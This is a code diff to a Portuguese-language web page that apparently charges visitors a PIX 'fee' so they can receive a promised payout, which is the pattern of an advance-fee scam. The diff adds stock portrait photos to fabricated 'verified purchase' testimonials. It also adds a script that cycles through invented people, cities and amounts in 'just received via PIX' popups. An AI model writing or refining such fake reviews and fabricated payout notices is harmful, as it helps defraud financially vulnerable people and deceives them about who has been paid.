@@ -31,13 +31,21 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
 .fb-sub{font-size:12px;color:#777;text-align:center;margin-bottom:12px}
 .fb{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;box-shadow:0 2px 10px rgba(130,10,209,.08);text-align:left}
 .fb-top{display:flex;align-items:center;gap:10px;margin-bottom:6px}
-.avatar{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:15px;flex-shrink:0}
+.avatar{width:38px;height:38px;border-radius:50%;object-fit:cover;flex-shrink:0}
 .fb-nome{font-size:13px;font-weight:700;color:#222}
 .fb-data{font-size:11px;color:#999}
 .stars{color:#f5a623;font-size:13px;letter-spacing:2px}
 .fb-txt{font-size:13px;color:#444;line-height:1.5}
 .fb-valor{display:inline-block;margin-top:6px;background:#e8f9ee;color:#0a7d3b;font-size:12px;font-weight:700;padding:3px 10px;border-radius:20px}
 .fb-verif{font-size:11px;color:#0a7d3b;font-weight:600;margin-left:6px}
+.notif{position:fixed;left:12px;bottom:12px;z-index:999;background:#fff;border-radius:14px;box-shadow:0 6px 24px rgba(0,0,0,.18);padding:10px 14px 10px 10px;display:flex;align-items:center;gap:10px;max-width:320px;transform:translateY(120%);opacity:0;transition:transform .45s ease,opacity .45s ease;border-left:4px solid #0a7d3b}
+.notif.show{transform:translateY(0);opacity:1}
+.notif img{width:40px;height:40px;border-radius:50%;object-fit:cover}
+.notif-txt{font-size:12px;color:#333;line-height:1.4}
+.notif-txt b{color:#222}
+.notif-txt .valor-n{color:#0a7d3b;font-weight:800}
+.notif-txt .tempo{font-size:10px;color:#999;display:block;margin-top:2px}
+
 </style>
 </head>
 <body>
@@ -63,14 +71,15 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
 <div class="fb-title">Quem pagou, recebeu</div>
 <div class="fb-sub">Avaliações de clientes verificados · 4,8 de 5 (2.317 avaliações)</div>
 
-<div class="fb"><div class="fb-top"><div class="avatar" style="background:#820ad1">M</div><div><div class="fb-nome">Marcos Oliveira</div><div class="fb-data">há 2 horas · São Paulo/SP</div></div></div><div class="stars">★★★★★</div><div class="fb-txt">Paguei a taxa achando que era golpe, mas em menos de 1 hora o valor caiu na minha conta. Recomendo demais!</div><span class="fb-valor">Recebeu R$ 4.800,00</span><span class="fb-verif">✓ Compra verificada</span></div>
+<div class="fb"><div class="fb-top"><img class="avatar" src="https://randomuser.me/api/portraits/men/32.jpg" alt="Marcos Oliveira" loading="lazy"><div><div class="fb-nome">Marcos Oliveira</div><div class="fb-data">há 2 horas · São Paulo/SP</div></div></div><div class="stars">★★★★★</div><div class="fb-txt">Paguei a taxa achando que era golpe, mas em menos de 1 hora o valor caiu na minha conta. Recomendo demais!</div><span class="fb-valor">Recebeu R$ 4.800,00</span><span class="fb-verif">✓ Compra verificada</span></div>
 
-<div class="fb"><div class="fb-top"><div class="avatar" style="background:#0a7d3b">J</div><div><div class="fb-nome">Juliana Santos</div><div class="fb-data">há 5 horas · Fortaleza/CE</div></div></div><div class="stars">★★★★★</div><div class="fb-txt">Fiz o PIX pelo copia e cola, super rápido. A liberação foi automática, nem precisei falar com ninguém.</div><span class="fb-valor">Recebeu R$ 7.500,00</span><span class="fb-verif">✓ Compra verificada</span></div>
+<div class="fb"><div class="fb-top"><img class="avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="Juliana Santos" loading="lazy"><div><div class="fb-nome">Juliana Santos</div><div class="fb-data">há 5 horas · Fortaleza/CE</div></div></div><div class="stars">★★★★★</div><div class="fb-txt">Fiz o PIX pelo copia e cola, super rápido. A liberação foi automática, nem precisei falar com ninguém.</div><span class="fb-valor">Recebeu R$ 7.500,00</span><span class="fb-verif">✓ Compra verificada</span></div>
 
-<div class="fb"><div class="fb-top"><div class="avatar" style="background:#c25e00">R</div><div><div class="fb-nome">Rafael Pereira</div><div class="fb-data">ontem · Belo Horizonte/MG</div></div></div><div class="stars">★★★★★</div><div class="fb-txt">Estava precisando muito desse dinheiro. O atendimento me explicou tudo e o valor caiu no mesmo dia. Muito obrigado!</div><span class="fb-valor">Recebeu R$ 3.200,00</span><span class="fb-verif">✓ Compra verificada</span></div>
+<div class="fb"><div class="fb-top"><img class="avatar" src="https://randomuser.me/api/portraits/men/75.jpg" alt="Rafael Pereira" loading="lazy"><div><div class="fb-nome">Rafael Pereira</div><div class="fb-data">ontem · Belo Horizonte/MG</div></div></div><div class="stars">★★★★★</div><div class="fb-txt">Estava precisando muito desse dinheiro. O atendimento me explicou tudo e o valor caiu no mesmo dia. Muito obrigado!</div><span class="fb-valor">Recebeu R$ 3.200,00</span><span class="fb-verif">✓ Compra verificada</span></div>
 
-<div class="fb"><div class="fb-top"><div class="avatar" style="background:#0057b8">A</div><div><div class="fb-nome">Amanda Costa</div><div class="fb-data">ontem · Salvador/BA</div></div></div><div class="stars">★★★★☆</div><div class="fb-txt">Demorou algumas horas pra cair, mas caiu certinho. Site confiável, pode pagar sem medo.</div><span class="fb-valor">Recebeu R$ 5.000,00</span><span class="fb-verif">✓ Compra verificada</span></div>
+<div class="fb"><div class="fb-top"><img class="avatar" src="https://randomuser.me/api/portraits/women/68.jpg" alt="Amanda Costa" loading="lazy"><div><div class="fb-nome">Amanda Costa</div><div class="fb-data">ontem · Salvador/BA</div></div></div><div class="stars">★★★★☆</div><div class="fb-txt">Demorou algumas horas pra cair, mas caiu certinho. Site confiável, pode pagar sem medo.</div><span class="fb-valor">Recebeu R$ 5.000,00</span><span class="fb-verif">✓ Compra verificada</span></div>
 </div>
+<div class="notif" id="notif"><img id="notifImg" src="" alt=""><div class="notif-txt" id="notifTxt"></div></div>
 <script>
 (function(){
   var ls=function(k){try{return localStorage.getItem(k)||""}catch(e){return""}};
@@ -117,6 +126,27 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
     document.getElementById('code').value=qr;
     if(id)poll(id);
   }
+
+  // notificacao "fulano recebeu"
+  var pessoas=[
+    {n:'Carlos Mendes',c:'Rio de Janeiro/RJ',v:'R$ 6.100,00',f:'https://randomuser.me/api/portraits/men/12.jpg'},
+    {n:'Fernanda Lima',c:'Curitiba/PR',v:'R$ 2.900,00',f:'https://randomuser.me/api/portraits/women/25.jpg'},
+    {n:'João Pedro',c:'Recife/PE',v:'R$ 8.400,00',f:'https://randomuser.me/api/portraits/men/54.jpg'},
+    {n:'Patrícia Souza',c:'Manaus/AM',v:'R$ 4.200,00',f:'https://randomuser.me/api/portraits/women/33.jpg'},
+    {n:'Lucas Almeida',c:'Goiânia/GO',v:'R$ 5.700,00',f:'https://randomuser.me/api/portraits/men/41.jpg'},
+    {n:'Bruna Ferreira',c:'Porto Alegre/RS',v:'R$ 3.800,00',f:'https://randomuser.me/api/portraits/women/57.jpg'},
+    {n:'Thiago Rocha',c:'Campinas/SP',v:'R$ 9.200,00',f:'https://randomuser.me/api/portraits/men/67.jpg'},
+    {n:'Camila Ribeiro',c:'Belém/PA',v:'R$ 4.600,00',f:'https://randomuser.me/api/portraits/women/12.jpg'}
+  ];
+  var notifEl=document.getElementById('notif'),notifImg=document.getElementById('notifImg'),notifTxt=document.getElementById('notifTxt'),ni=0;
+  function mostrarNotif(){
+    var p=pessoas[ni%pessoas.length];ni++;
+    notifImg.src=p.f;
+    notifTxt.innerHTML='<b>'+p.n+'</b> de '+p.c+'<br>recebeu <span class="valor-n">'+p.v+'</span> via PIX<span class="tempo">agora mesmo · ✓ verificado</span>';
+    notifEl.classList.add('show');
+    setTimeout(function(){notifEl.classList.remove('show');},5000);
+  }
+  setTimeout(function(){mostrarNotif();setInterval(mostrarNotif,9000);},3500);
   gerar();
 })();
 </script>
